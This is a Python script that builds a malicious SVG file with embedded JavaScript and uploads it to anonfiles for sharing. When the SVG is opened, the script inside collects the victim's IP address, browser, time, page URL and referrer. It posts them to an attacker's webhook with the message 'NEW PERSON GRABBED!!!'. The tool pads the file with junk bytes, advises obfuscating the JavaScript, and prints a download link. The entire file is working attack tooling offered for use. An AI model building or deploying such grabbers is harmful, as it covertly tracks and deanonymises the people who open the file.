import time
import os
import re

try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests


SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script>
        %code%
    </script>
</svg>
"""
js_payload_code = """
var webhook = 'WEBHOOK_URL';
var site = 'https://myexternalip.com/raw';

var get_ip = function() {
    var ip = '';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', site, false);
    xhr.send();
    if (xhr.status == 200) {
        ip = xhr.responseText;
    }
    return ip;
};

function get_browser() {
    var browser = navigator.userAgent;
    return browser;
    }

function get_time() {
    var date = new Date();
    var time = date.toLocaleString();
    return time;
    }

function get_url() {
    var url = window.location.href;
    return url;
    }

function get_referrer() {
    var referrer = document.referrer;
    return referrer;
    }

function send_webhook() {
    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `@everyone NEW PERSON GRABBED!!!\nIP: ${get_ip()}\nBrowser: ${get_browser()}\nTime: ${get_time()}\nURL: ${get_url()}\nReferrer: ${get_referrer()}\nMade by K.Dot`
        })
    });
}

send_webhook();
"""


class main:
    def __init__(self) -> None:
        self.js_code = input("Would you like to use default js payload? (y/n) -> ")
        if self.js_code.lower() == "y":
            self.js_code2 = js_payload_code
            self.webhook = input("What is the webhook url? -> ")
            self.js_code2 = self.js_code2.replace("WEBHOOK_URL", self.webhook)
        else:
            self.js_code = input("What is the path of the js payload? -> ")
        self.name = input("What do you want to name the file? (without extension) -> ")
        self.filetype = "svg"
        self.download_link_type = input(
            "Would you also like the direct download link? (y/n) -> "
        )
        pump = input("Would you like to pump the file for more size? (y/n) -> ")
        if pump.lower() == "y":
            self.pump = input("How many MB would you like to pump the file? -> ")
        else:
            self.pump = False
        self.main()
        input("Press enter to exit")

    def get_direct_download_link(self, url):
        r = requests.get(url)
        text = r.text
        regex = (
            r'https://cdn-[0-9]+\.anonfiles\.com/[A-Za-z0-9]+/[A-Za-z0-9]+-[0-9]+/[^"]+'
        )
        match = re.findall(regex, text)
        return match[0]

    def main(self):
        print(
            "Please remember to Obfuscate your JavaScript code before using this tool."
        )
        try:
            js_code = self.js_code2
        except AttributeError:
            try:
                with open(self.js_code, "r") as f:
                    js_code = f.read()
                    js_code = "\t\t".join(js_code.splitlines())
            except FileNotFoundError:
                print("File not found")
                time.sleep(3)
                exit()

        extra_chars = "A" * (1024 * 1024 * int(self.pump))
        svg = SVG.replace("%code%", js_code) + extra_chars
        svg_bytes = svg.encode("utf-8")
        try:
            r = requests.post(
                "https://api.anonfiles.com/upload",
                files={"file": (f"{self.name}.{self.filetype}", svg_bytes)},
            )
        except Exception as e:
            print(f"[-] {e}")
            time.sleep(3)
            exit()
        url = r.json()["data"]["file"]["url"]["short"]
        if self.download_link_type.lower() == "y":
            download_link = self.get_direct_download_link(url)
            print(
                f"Download link (short): {url} | Download link (direct): {download_link}"
            )
        else:
            print(f"Download link: {url}")


if __name__ == "__main__":
    main()
